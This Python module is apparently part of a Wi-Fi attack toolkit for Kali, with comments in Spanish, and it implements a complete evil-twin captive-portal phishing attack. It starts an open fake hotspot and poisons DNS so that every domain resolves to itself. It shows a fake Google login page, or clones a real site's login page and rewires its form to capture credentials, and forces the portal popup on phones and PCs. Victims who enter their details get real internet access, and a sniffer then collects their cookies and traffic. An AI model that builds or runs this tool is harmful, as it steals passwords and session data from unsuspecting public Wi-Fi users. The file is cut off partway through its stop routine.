"""
core/captive_portal.py
======================
Módulo de Captive Portal (Evil Twin Público)
-------------------------------------------
Simula una red WiFi pública de tipo "FreeMallWiFi" que al conectarse
muestra una página de login (estilo Google o plantilla personalizada
clonada de una URL real) para capturar credenciales del usuario.

Tras el login, la víctima recibe internet real via NAT (eth0 u otra
interfaz de salida). Simultáneamente se activa el sniffer de tráfico
HTTP para capturar cookies y credenciales en claro mientras navegan.

Stack técnico:
  - hostapd    → AP abierto (sin contraseña) con el SSID elegido
  - dnsmasq    → DHCP + DNS poisoning (responde GATEWAY_IP a todo)
                 DHCP option 114 anuncia la URL del portal (iOS 14+)
                 local-ttl=0 evita que el OS cachee la detección
  - iptables   → DNAT TCP/80+443 al portal hasta el primer login;
                 luego NAT hacia out_interface para dar internet real.
                 DNS fix: DNAT UDP/TCP 53 de IPs autenticadas → 8.8.8.8
                 (sin esto dnsmasq sigue respondiendo 10.0.0.1 a todo
                 y el móvil "tiene internet" pero no resuelve nada)
  - Flask      → sirve la página de phishing, rutas OS-probe que
                 devuelven 302 para forzar el popup en iOS/Android/Win,
                 y recoge credenciales
  - WireTrapSniffer → captura HTTP/cookies/DNS del tráfico post-login

Requisitos en Kali:
  sudo apt install hostapd dnsmasq python3-flask python3-scapy
  pip install requests beautifulsoup4
  (la interfaz debe estar en modo managed, NO en monitor)
"""

import subprocess
import threading
import os
import sys
import time
import json
import base64
import mimetypes
from datetime import datetime
from urllib.parse import urljoin, urlparse

WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, WIRETRAP_DIR)

# ── Configuración de red del portal ─────────────────────────────

GATEWAY_IP   = "10.0.0.1"
DHCP_START   = "10.0.0.10"
DHCP_END     = "10.0.0.100"
SUBNET_MASK  = "255.255.255.0"
FLASK_PORT   = 80
UPSTREAM_DNS = "8.8.8.8"   # DNS real para víctimas autenticadas


# ── Plantilla HTML: estilo Google ───────────────────────────────

_PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Conectarse a la Red – Iniciar sesión con Google</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', Arial, sans-serif;
    background: #f2f2f2;
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh;
  }
  .card {
    background: white; border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,.15);
    width: 360px; padding: 40px 36px 36px; text-align: center;
  }
  .google-logo { font-size: 28px; color: #5f6368; font-weight: 300;
    letter-spacing:-1px; margin-bottom: 28px; }
  .google-logo span.G  { color:#4285F4; }
  .google-logo span.o1 { color:#EA4335; }
  .google-logo span.o2 { color:#FBBC05; }
  .google-logo span.g  { color:#34A853; }
  .google-logo span.l  { color:#4285F4; }
  .google-logo span.e  { color:#EA4335; }
  h2 { font-size: 24px; color: #202124; font-weight: 400; margin-bottom: 8px; }
  p.sub { color: #5f6368; font-size: 14px; margin-bottom: 28px; }
  input[type=email], input[type=password] {
    width: 100%; border: 1px solid #dadce0; border-radius: 4px;
    padding: 13px 14px; font-size: 15px; outline: none;
    margin-bottom: 16px; color: #202124;
  }
  input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.2); }
  .links { text-align: left; margin-bottom: 24px; }
  .links a { color: #1a73e8; font-size: 13px; text-decoration: none; }
  .btn-next {
    background: #1a73e8; color: white; border: none; border-radius: 4px;
    padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; float: right;
  }
  .btn-next:hover { background: #1765c7; }
  .btn-row { display: flex; justify-content: space-between; align-items: center; }
  .create-link a { color: #1a73e8; font-size: 13px; text-decoration: none; font-weight: 500; }
  .footer { margin-top: 30px; font-size: 11px; color: #5f6368; }
  .info-bar {
    background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px;
    padding: 8px 12px; font-size: 12px; color: #856404; margin-bottom: 20px; text-align: left;
  }
</style>
</head>
<body>
<div class="card">
  <div class="google-logo">
    <span class="G">G</span><span class="o1">o</span><span class="o2">o</span><span class="g">g</span><span class="l">l</span><span class="e">e</span>
  </div>
  <h2>Iniciar sesión</h2>
  <p class="sub">para continuar en la red WiFi</p>
  <div class="info-bar">
    🔒 Conexión gratuita a la red WiFi pública.
    Se requiere autenticación para acceder a Internet.
  </div>
  <form method="POST" action="/login">
    <input name="email" type="email" placeholder="Correo electrónico o teléfono" required autofocus>
    <div class="links"><a href="#">¿Olvidaste tu correo?</a></div>
    <input name="password" type="password" placeholder="Contraseña" required>
    <div class="links"><a href="#">¿Olvidaste tu contraseña?</a></div>
    <div class="btn-row">
      <div class="create-link"><a href="#">Crear cuenta</a></div>
      <button class="btn-next" type="submit">Siguiente</button>
    </div>
  </form>
  <div class="footer">Español (España) • Ayuda • Privacidad • Términos</div>
</div>
</body>
</html>
"""

_PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="2;url=https://www.google.com">
<title>Conectado</title>
<style>
  body { font-family:Arial,sans-serif; background:#f2f2f2;
         display:flex; align-items:center; justify-content:center; height:100vh; }
  .box { background:white; border-radius:8px; padding:40px; text-align:center;
         box-shadow:0 2px 10px rgba(0,0,0,.1); }
  h2 { color:#34A853; font-size:22px; margin-bottom:10px; }
  p  { color:#5f6368; font-size:14px; }
</style>
</head>
<body>
<div class="box">
  <h2>✅ ¡Conectado!</h2>
  <p>Ahora tienes acceso a Internet.</p>
  <p>Redirigiendo a Google...</p>
</div>
</body>
</html>
"""


# ── Clonador de páginas de login ─────────────────────────────────

def clone_login_page(url: str, log_fn=None) -> str:
    """
    Descarga la página de login indicada por 'url' y devuelve un HTML
    autocontenido con todos los recursos (CSS, imágenes, fuentes, JS)
    incrustados como data-URI en base64.

    El HTML resultante se modifica para que:
      - El primer <form> con campos de password apunte a POST /login
      - Los campos del form se renombren a "email" y "password"
        (para que Flask los capture igual que en la plantilla Google)

    Args:
        url: URL de una página de login real (p.ej. login de McDonalds WiFi)
        log_fn: función opcional para recibir mensajes de progreso

    Returns:
        str con el HTML autocontenido, o "" si falla
    """
    def _log(msg):
        if log_fn:
            log_fn(msg)

    try:
        import requests
        from bs4 import BeautifulSoup
    except ImportError:
        _log("[!] Faltan dependencias: pip3 install requests beautifulsoup4 --break-system-packages")
        return ""

    import re as _re

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
    }

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    html_text = ""
    final_url = url

    # ── 1. Intentar con requests (headers reales + cookies de sesión) ─
    _log(f"[*] Iniciando clonación de: {url}")
    try:
        session = requests.Session()
        session.headers.update(headers)
        session.verify = False
        # Visitar la home primero para obtener cookies de sesión
        from urllib.parse import urlparse as _up
        parsed = _up(url)
        home_url = f"{parsed.scheme}://{parsed.netloc}/"
        try:
            session.get(home_url, timeout=10, allow_redirects=True)
        except Exception:
            pass
        _log(f"[*] Descargando página: {url}")
        resp = session.get(url, timeout=20, allow_redirects=True)
        resp.raise_for_status()
        final_url = resp.url
        encoding = resp.encoding or "utf-8"
        try:
            html_text = resp.content.decode(encoding, errors="replace")
        except Exception:
            html_text = resp.text
        _log(f"[*] Descargado con requests ({len(html_text)} bytes). URL final: {final_url}")
    except Exception as e:
        _log(f"[!] requests falló: {e}")
        html_text = ""

    # ── 2. Fallback: Playwright headless (para sitios con JS pesado) ─
    if not html_text or len(html_text) < 500:
        _log("[*] Intentando con Playwright headless (puede tardar ~10s)...")
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as pw:
                browser = pw.chromium.launch(
                    headless=True,
                    args=["--no-sandbox", "--disable-setuid-sandbox",
                          "--disable-blink-features=AutomationControlled"]
                )
                ctx = browser.new_context(
                    user_agent=headers["User-Agent"],
                    locale="es-ES",
                    viewport={"width": 1280, "height": 800},
                    ignore_https_errors=True,
                )
                page = ctx.new_page()
                page.goto(url, wait_until="networkidle", timeout=30000)
                final_url = page.url
                html_text = page.content()
                browser.close()
            _log(f"[*] Playwright OK ({len(html_text)} bytes). URL final: {final_url}")
        except ImportError:
            _log("[!] Playwright no disponible. Instala: pip3 install playwright --break-system-packages && playwright install chromium")
            if not html_text:
                return ""
        except Exception as e2:
            _log(f"[!] Playwright también falló: {e2}")
            if not html_text:
                return ""

    soup = BeautifulSoup(html_text, "html.parser")

    # Sesión para descargar recursos (disponible incluso si usó Playwright)
    _res_session = requests.Session()
    _res_session.headers.update(headers)
    _res_session.verify = False

    # ── 3. Función auxiliar: descargar recurso → data URI ────────
    def _resource_to_data_uri(href, base_url):
        abs_url = urljoin(base_url, href)
        # Sólo recursos HTTP/HTTPS
        scheme = urlparse(abs_url).scheme
        if scheme not in ("http", "https"):
            return None
        try:
            r = _res_session.get(abs_url, timeout=10, allow_redirects=True)
            if r.status_code != 200:
                return None
            content_type = r.headers.get("Content-Type", "").split(";")[0].strip()
            if not content_type:
                # Adivinar por extensión
                ext = os.path.splitext(urlparse(abs_url).path)[1].lower()
                content_type = mimetypes.types_map.get(ext, "application/octet-stream")
            b64 = base64.b64encode(r.content).decode("ascii")
            return f"data:{content_type};base64,{b64}"
        except Exception:
            return None

    # ── 4. Inlinar CSS externos ──────────────────────────────────
    for tag in soup.find_all("link", rel=lambda v: v and "stylesheet" in v):
        href = tag.get("href", "")
        if not href or href.startswith("data:"):
            continue
        _log(f"  [css] {href[:80]}")
        data_uri = _resource_to_data_uri(href, final_url)
        if data_uri:
            new_style = soup.new_tag("style")
            # Descargar el CSS y resolver sus url() también
            try:
                abs_url = urljoin(final_url, href)
                css_resp = _res_session.get(abs_url, timeout=10)
                css_text = css_resp.text
                # Reemplazar url(...) dentro del CSS con data URIs
                import re as _re
                def _replace_css_url(m):
                    raw = m.group(1).strip("'\" ")
                    if raw.startswith("data:"):
                        return m.group(0)
                    d = _resource_to_data_uri(raw, abs_url)
                    return f"url({d})" if d else m.group(0)
                css_text = _re.sub(r"url\(([^)]+)\)", _replace_css_url, css_text)
                new_style.string = css_text
            except Exception:
                new_style.string = f"/* could not inline {href} */"
            tag.replace_with(new_style)

    # ── 5. Inlinar imágenes (<img src=>) ─────────────────────────
    for tag in soup.find_all("img"):
        src = tag.get("src", "")
        if not src or src.startswith("data:"):
            continue
        _log(f"  [img] {src[:80]}")
        data_uri = _resource_to_data_uri(src, final_url)
        if data_uri:
            tag["src"] = data_uri

    # ── 5. Inlinar fuentes y otros recursos en <style> inline ────
    import re as _re
    for style_tag in soup.find_all("style"):
        if style_tag.string:
            def _replace_css_url2(m):
                raw = m.group(1).strip("'\" ")
                if raw.startswith("data:"):
                    return m.group(0)
                d = _resource_to_data_uri(raw, final_url)
                return f"url({d})" if d else m.group(0)
            style_tag.string = _re.sub(r"url\(([^)]+)\)", _replace_css_url2, style_tag.string)

    # ── 6. Inlinar atributos background/style inline ─────────────
    for tag in soup.find_all(style=True):
        style_val = tag["style"]
        def _replace_inline(m):
            raw = m.group(1).strip("'\" ")
            if raw.startswith("data:"):
                return m.group(0)
            d = _resource_to_data_uri(raw, final_url)
            return f"url({d})" if d else m.group(0)
        tag["style"] = _re.sub(r"url\(([^)]+)\)", _replace_inline, style_val)

    # ── 7. Adaptar el formulario para capturar credenciales ───────
    # Buscar el form que tenga input[type=password]
    target_form = None
    for form in soup.find_all("form"):
        if form.find("input", {"type": "password"}):
            target_form = form
            break

    if target_form:
        target_form["method"] = "POST"
        target_form["action"] = "/login"
        # Renombrar el primer campo de texto/email → "email"
        email_input = (target_form.find("input", {"type": "email"})
                       or target_form.find("input", {"type": "text"})
                       or target_form.find("input", {"type": "tel"}))
        if email_input:
            email_input["name"] = "email"
        # Renombrar el campo password → "password"
        pwd_input = target_form.find("input", {"type": "password"})
        if pwd_input:
            pwd_input["name"] = "password"
        _log("[+] Formulario adaptado → POST /login (email, password)")
    else:
        # No encontró form con password: inyectar uno encima del body
        _log("[!] No se encontró form con password; inyectando overlay de login")
        overlay_html = """
<div id="wt-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;
  background:rgba(0,0,0,0.7);z-index:99999;display:flex;align-items:center;
  justify-content:center;">
  <div style="background:white;border-radius:8px;padding:40px;width:340px;text-align:center;
    box-shadow:0 4px 24px rgba(0,0,0,0.5);">
    <h2 style="margin-bottom:16px;font-size:20px;color:#333;">Inicia sesión para continuar</h2>
    <form method="POST" action="/login">
      <input name="email" type="email" placeholder="Correo electrónico" required
        style="width:100%;padding:10px;margin-bottom:12px;border:1px solid #ccc;
               border-radius:4px;font-size:14px;">
      <input name="password" type="password" placeholder="Contraseña" required
        style="width:100%;padding:10px;margin-bottom:16px;border:1px solid #ccc;
               border-radius:4px;font-size:14px;">
      <button type="submit"
        style="width:100%;background:#1a73e8;color:white;border:none;border-radius:4px;
               padding:11px;font-size:15px;cursor:pointer;">Acceder</button>
    </form>
  </div>
</div>"""
        body = soup.find("body")
        if body:
            body.insert(0, BeautifulSoup(overlay_html, "html.parser"))

    # ── 8. Eliminar scripts externos (pueden romper el portal) ────
    for tag in soup.find_all("script", src=True):
        tag.decompose()

    # ── 9. Quitar <base> tags que redirigirían recursos externos ──
    for tag in soup.find_all("base"):
        tag.decompose()

    _log("[+] Clonación completada")
    return str(soup)


# ── Flask app ────────────────────────────────────────────────────

def _build_flask_app(gateway_ip, template_type, creds_log,
                     custom_html=None,
                     on_credential=None, on_client_login=None):
    """
    Construye la app Flask del portal.

    template_type: "google" | "custom"
    custom_html:   HTML clonado (solo cuando template_type == "custom")

    Incluye rutas de detección para cada SO:
      - iOS/macOS: /hotspot-detect.html, /library/test/success.html
      - Android:   /generate_204, /gen_204, /connectivitycheck
      - Windows:   /connecttest.txt, /ncsi.txt
      - Firefox:   /canonical.html
    """
    try:
        from flask import Flask, request, make_response, redirect
    except ImportError:
        return None

    app = Flask(__name__)
    app.secret_key = os.urandom(16)

    if template_type == "custom" and custom_html:
        portal_html = custom_html
    else:
        portal_html = _PORTAL_HTML_GOOGLE

    portal_url = f"http://{gateway_ip}/"

    # ── Rutas de detección OS (OS Captive Portal Probes) ──────────
    @app.route("/hotspot-detect.html")
    @app.route("/library/test/success.html")
    @app.route("/hotspot-detect")
    def apple_probe():
        """iOS/macOS espera '<html><body>Success</body></html>'."""
        return redirect(portal_url, 302)

    @app.route("/generate_204")
    @app.route("/gen_204")
    @app.route("/generate204")
    @app.route("/connectivitycheck")
    @app.route("/connectivitycheck.html")
    def android_probe():
        """Android espera HTTP 204 vacío."""
        return redirect(portal_url, 302)

    @app.route("/connecttest.txt")
    @app.route("/ncsi.txt")
    def windows_probe():
        """Windows 10 espera 'Microsoft Connect Test'; NCSI legacy 'Microsoft NCSI'."""
        return redirect(portal_url, 302)

    @app.route("/canonical.html")
    def firefox_probe():
        """Firefox Network Connectivity Check."""
        return redirect(portal_url, 302)

    # ── Portal principal ──────────────────────────────────────────

    @app.route("/login", methods=["POST"])
    def login():
        email    = request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()
        ip       = request.remote_addr
        ts       = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry    = {"timestamp": ts, "ip": ip, "email": email, "password": password}
        creds_log.append(entry)
        if on_credential:
            on_credential(entry)
        if on_client_login:
            on_client_login(ip)
        return make_response(_PORTAL_HTML_SUCCESS, 200)

    @app.route("/favicon.ico")
    def favicon():
        return "", 204

    @app.route("/", defaults={"path": ""})
    @app.route("/<path:path>")
    def catch_all(path):
        return make_response(portal_html, 200)

    return app


# ── Clase principal ──────────────────────────────────────────────

class CaptivePortal:
    """
    Levanta un AP abierto + DHCP + DNS poisoning + portal de phishing.

    Flujo:
      1. Víctima se conecta → OS detecta portal via probes HTTP → popup
      2. Víctima hace submit → credenciales capturadas
      3. Se activa NAT para su IP → tiene internet real
         (DNS fix: su UDP/TCP 53 se redirige a 8.8.8.8 para que
          los nombres resuelvan aunque dnsmasq siga envenenando)
      4. WireTrapSniffer captura cookies/HTTP mientras navega
    """

    def __init__(self, interface: str):
        self.interface     = interface
        self.out_interface = "eth0"
        self.running       = False

        self.ssid          = "FreeWiFi"
        self.channel       = 6
        self.template_type = "google"
        self.custom_html   = ""       # HTML clonado (usado si template_type=="custom")

        self.captured_creds  = []
        self._logged_in_ips  = set()

        self._hostapd_conf = "/tmp/wt_cp_hostapd.conf"
        self._dnsmasq_conf = "/tmp/wt_cp_dnsmasq.conf"
        self._dnsmasq_pid  = "/tmp/wt_cp_dnsmasq.pid"

        self._hostapd_proc = None
        self._dnsmasq_proc = None
        self._flask_thread = None
        self._sniffer      = None

        # Callbacks GUI
        self.on_started    = None
        self.on_stopped    = None
        self.on_error      = None
        self.on_credential = None
        self.on_sniff_data = None
        self.on_log        = None

    # ── Utilidades ───────────────────────────────────────────────

    def _log(self, msg):
        if self.on_log:
            self.on_log(msg)

    def _err(self, msg):
        if self.on_error:
            self.on_error(msg)

    @staticmethod
    def _hw_mode(channel):
        return "a" if channel >= 36 else "g"

    # ── Clonación de plantilla personalizada ─────────────────────

    def clone_template(self, url: str) -> bool:
        """
        Clona la página de login en 'url' y la guarda en self.custom_html.
        Retorna True si tuvo éxito, False si falló.
        Puede llamarse desde la GUI antes de start().
        """
        self._log(f"[*] Iniciando clonación de: {url}")
        html = clone_login_page(url, log_fn=self._log)
        if html:
            self.custom_html = html
            self.template_type = "custom"
            self._log(f"[+] Plantilla clonada OK ({len(html)} bytes)")
            return True
        else:
            self._err("No se pudo clonar la plantilla.")
            return False

    # ── Configuraciones ──────────────────────────────────────────

    def _write_hostapd_conf(self):
        hw = self._hw_mode(self.channel)
        conf = (f"interface={self.interface}\ndriver=nl80211\nssid={self.ssid}\n"
                f"hw_mode={hw}\nchannel={self.channel}\nauth_algs=1\nwpa=0\n"
                f"ignore_broadcast_ssid=0\nieee80211n=1\nwmm_enabled=1\n")
        open(self._hostapd_conf, "w").write(conf)
        self._log(f"hostapd.conf → {self._hostapd_conf}")

    def _write_dnsmasq_conf(self):
        """
        Genera la config de dnsmasq con:
          - DNS poisoning: address=/#/GATEWAY_IP  (todo dominio → portal)
          - DHCP option 114: anuncia la URL del portal cautivo directamente
            en el DHCP. iOS 14+ abre el popup sin necesidad de HTTP probe.
          - local-ttl=0: los clientes no cachean la detección del portal,
            así el popup aparece siempre aunque el móvil ya se haya conectado
            antes a esta red.
          - Lease corta (5m): fuerza re-negociación rápida para re-detección.
        """
        conf = (
            f"interface={self.interface}\n"
            f"bind-interfaces\n"
            f"dhcp-range={DHCP_START},{DHCP_END},{SUBNET_MASK},5m\n"
            f"dhcp-option=3,{GATEWAY_IP}\n"
            f"dhcp-option=6,{GATEWAY_IP}\n"
            f"dhcp-option=114,http://{GATEWAY_IP}/\n"
            f"address=/#/{GATEWAY_IP}\n"
            f"local-ttl=0\n"
            f"log-dhcp\n"
            f"no-resolv\n"
        )
        open(self._dnsmasq_conf, "w").write(conf)
        self._log(f"dnsmasq.conf → {self._dnsmasq_conf}")

    # ── Red ──────────────────────────────────────────────────────

    def _configure_interface(self):
        subprocess.run(["nmcli", "dev", "set", self.interface, "managed", "no"],
                       capture_output=True)
        subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True)
        subprocess.run(["ip", "addr", "flush", "dev", self.interface], capture_output=True)
        subprocess.run(["ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", self.interface],
                       capture_output=True)
        self._log(f"Interfaz {self.interface} → {GATEWAY_IP}/24")

    def _setup_iptables_portal(self):
        """
        Configura iptables para el modo portal:
          - DNAT TCP/80 y 443 al Flask local
          - FORWARD DROP para todo el tráfico (sin internet)
          - ESTABLISHED/RELATED ACCEPT para que el NAT funcione luego
        """
        iface = self.interface
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["iptables", "-F"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)

        subprocess.run(["iptables", "-A", "INPUT", "-i", "lo", "-j", "ACCEPT"],
                       capture_output=True)
        subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                        "-p", "udp", "--dport", "53", "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                        "-p", "udp", "--dport", "67", "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                        "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], capture_output=True)

        subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                        "-i", iface, "-p", "tcp", "--dport", "80",
                        "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
                       capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                        "-i", iface, "-p", "tcp", "--dport", "443",
                        "-j", "DNAT", f"--to-destination={GATEWAY_IP}:{FLASK_PORT}"],
                       capture_output=True)

        subprocess.run(["iptables", "-A", "FORWARD",
                        "-m", "conntrack", "--ctstate", "ESTABLISHED,RELATED",
                        "-j", "ACCEPT"], capture_output=True)

        subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                       capture_output=True)

        self._log("iptables: modo portal (sin internet)")

    def _grant_internet(self, client_ip):
        """
        Abre internet real para una IP que ya pasó el portal.

        Problema resuelto:
          dnsmasq tiene address=/#/GATEWAY_IP que envenena TODOS los dominios.
          Aunque abramos el FORWARD y pongamos MASQUERADE, el móvil sigue
          resolviendo google.com → 10.0.0.1 (portal) en lugar del IP real.
          Solución: DNAT UDP/TCP 53 de esta IP al DNS real (8.8.8.8).
          Así su DNS va directo a Google en lugar de pasar por dnsmasq.
        """
        iface  = self.interface
        out_if = self.out_interface

        subprocess.run(["iptables", "-D", "FORWARD", "-i", iface, "-j", "DROP"],
                       capture_output=True)

        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
                        "-i", iface, "-s", client_ip,
                        "-p", "udp", "--dport", "53",
                        "-j", "DNAT", f"--to-destination={UPSTREAM_DNS}:53"],
                       capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
                        "-i", iface, "-s", client_ip,
                        "-p", "tcp", "--dport", "53",
                        "-j", "DNAT", f"--to-destination={UPSTREAM_DNS}:53"],
                       capture_output=True)

        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
                        "-i", iface, "-s", client_ip,
                        "-p", "tcp", "--dport", "80", "-j", "RETURN"],
                       capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
                        "-i", iface, "-s", client_ip,
                        "-p", "tcp", "--dport", "443", "-j", "RETURN"],
                       capture_output=True)

        subprocess.run(["iptables", "-I", "FORWARD", "1",
                        "-i", iface, "-s", client_ip,
                        "-o", out_if, "-j", "ACCEPT"],
                       capture_output=True)
        subprocess.run(["iptables", "-I", "FORWARD", "1",
                        "-i", out_if, "-d", client_ip,
                        "-o", iface, "-j", "ACCEPT"],
                       capture_output=True)

        subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                       capture_output=True)

        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                        "-s", client_ip, "-o", out_if, "-j", "MASQUERADE"],
                       capture_output=True)

        subprocess.run(["iptables", "-I", "FORWARD", "1",
                        "-i", iface, "-s", client_ip,
                        "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
                       capture_output=True)
        subprocess.run(["iptables", "-I", "FORWARD", "1",
                        "-i", iface, "-s", client_ip,
                        "-p", "tcp", "--dport", "53", "-j", "ACCEPT"],
                       capture_output=True)

        self._log(f"[+] Internet concedido a {client_ip} via {out_if} (DNS → {UPSTREAM_DNS})")

    def _clear_iptables(self):
        subprocess.run(["iptables", "-F"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        self._log("iptables limpiado")

    # ── Subprocesos ──────────────────────────────────────────────

    def _start_hostapd(self):
        try:
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", self._hostapd_conf],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            time.sleep(2)
            if self._hostapd_proc.poll() is not None:
                out = self._hostapd_proc.stdout.read().decode(errors="ignore")
                self._err(f"hostapd terminó prematuramente:\n{out}")
                return False
            self._log(f"hostapd arrancado (PID {self._hostapd_proc.pid})")
            return True
        except FileNotFoundError:
            self._err("hostapd no encontrado: sudo apt install hostapd")
            return False
        except Exception as e:
            self._err(f"Error hostapd: {e}")
            return False

    def _start_dnsmasq(self):
        try:
            subprocess.run(["pkill", "-f", "wt_cp_dnsmasq"], capture_output=True)
            time.sleep(0.5)
            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", self._dnsmasq_conf, "--no-daemon",
                 "--pid-file=" + self._dnsmasq_pid],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            time.sleep(1)
            if self._dnsmasq_proc.poll() is not None:
                out = self._dnsmasq_proc.stdout.read().decode(errors="ignore")
                self._err(f"dnsmasq terminó prematuramente:\n{out}")
                return False
            self._log(f"dnsmasq arrancado (PID {self._dnsmasq_proc.pid})")
            return True
        except FileNotFoundError:
            self._err("dnsmasq no encontrado: sudo apt install dnsmasq")
            return False
        except Exception as e:
            self._err(f"Error dnsmasq: {e}")
            return False

    def _start_flask(self):
        try:
            from flask import Flask  # noqa
        except ImportError:
            self._err("Flask no encontrado: sudo apt install python3-flask")
            return False

        app = _build_flask_app(
            gateway_ip=GATEWAY_IP,
            template_type=self.template_type,
            creds_log=self.captured_creds,
            custom_html=self.custom_html if self.template_type == "custom" else None,
            on_credential=self._on_new_credential,
            on_client_login=self._on_client_login
        )
        if not app:
            self._err("No se pudo construir la app Flask.")
            return False

        def run_flask():
            try:
                import logging as _lg
                _lg.getLogger("werkzeug").setLevel(_lg.ERROR)
                app.run(host="0.0.0.0", port=FLASK_PORT,
                        threaded=True, use_reloader=False, debug=False)
            except Exception as ex:
                self._err(f"Flask error: {ex}")

        self._flask_thread = threading.Thread(target=run_flask, daemon=True)
        self._flask_thread.start()
        self._log(f"Flask portal en http://0.0.0.0:{FLASK_PORT}")
        return True

    def _start_sniffer(self):
        try:
            from post_exploitation.sniffer import WireTrapSniffer
        except ImportError:
            self._log("[!] Sniffer no disponible (instala python3-scapy)")
            return

        self._sniffer = WireTrapSniffer(self.interface)

        def _fwd(data):
            self._log(f"[SNIFF] {data.data_type} | {data.source_ip} | {data.value[:80]}")
            if self.on_sniff_data:
                self.on_sniff_data(data)

        self._sniffer.on_data = _fwd
        self._sniffer.start()
        self._log(f"Sniffer HTTP activo en {self.interface}")

    # ── Callbacks internos ───────────────────────────────────────

    def _on_new_credential(self, entry):
        self._log(f"[!!!] CREDENCIAL  IP={entry['ip']}  "
                  f"email={entry['email']}  pass={entry['password']}")
        if self.on_credential:
            self.on_credential(entry)

    def _on_client_login(self, client_ip):
        """Llamado por Flask cuando una víctima hace submit."""
        if client_ip in self._logged_in_ips:
            return
        self._logged_in_ips.add(client_ip)
        self._log(f"[*] Login desde {client_ip} — activando internet + sniffer")

        def _activate():
            self._grant_internet(client_ip)
            if self._sniffer is None:
                self._start_sniffer()

        threading.Thread(target=_activate, daemon=True).start()

    # ── API pública ──────────────────────────────────────────────

    def start(self, ssid="FreeWiFi", channel=6,
              template="google", out_interface="eth0"):
        """
        Arranca el ataque completo.

        Args:
            ssid:          SSID del AP falso (p.ej. "MallWiFi_FREE")
            channel:       Canal 802.11 (1-13 para 2.4 GHz)
            template:      "google" | "custom"
            out_interface: Interfaz con internet real (eth0, wlan1...)

        Nota: si template=="custom", llama primero a clone_template(url)
        para preparar self.custom_html antes de start().
        """
        if self.running:
            self._log("Ya está en ejecución.")
            return

        self.ssid          = ssid
        self.channel       = max(1, min(13, int(channel)))
        self.template_type = template
        self.out_interface = out_interface
        self.captured_creds.clear()
        self._logged_in_ips.clear()
        self._sniffer = None

        self._log("=== Iniciando Captive Portal ===")
        self._log(f"  SSID      : {self.ssid}")
        self._log(f"  Canal     : {self.channel}")
        self._log(f"  Plantilla : {self.template_type}")
        self._log(f"  Internet  : {self.out_interface}")

        if template == "custom" and not self.custom_html:
            self._err("Plantilla personalizada seleccionada pero no se ha clonado ninguna URL. "
                      "Usa 'Clonar Plantilla' antes de iniciar.")
            return

        self._write_hostapd_conf()
        self._write_dnsmasq_conf()
        self._configure_interface()

        if not self._start_hostapd():
            self._cleanup(); return
        if not self._start_dnsmasq():
            self._cleanup(); return

        self._setup_iptables_portal()

        if not self._start_flask():
            self._cleanup(); return

        self.running = True
        self._log("=== Portal Cautivo ACTIVO — Esperando víctimas ===")
        if self.on_started:
            self.on_started()

    def stop(self):
        """Detiene todo y limpia el sistema."""
        if not self.running and not self._hostapd_proc and not self._dnsmasq_proc:
            return

        self.running = False
        self._log("Deteniendo Captive Portal...")

        if self._sniffer:
            try: self._sniffer.stop()
            except Exception: pass
            self._sniffer = None

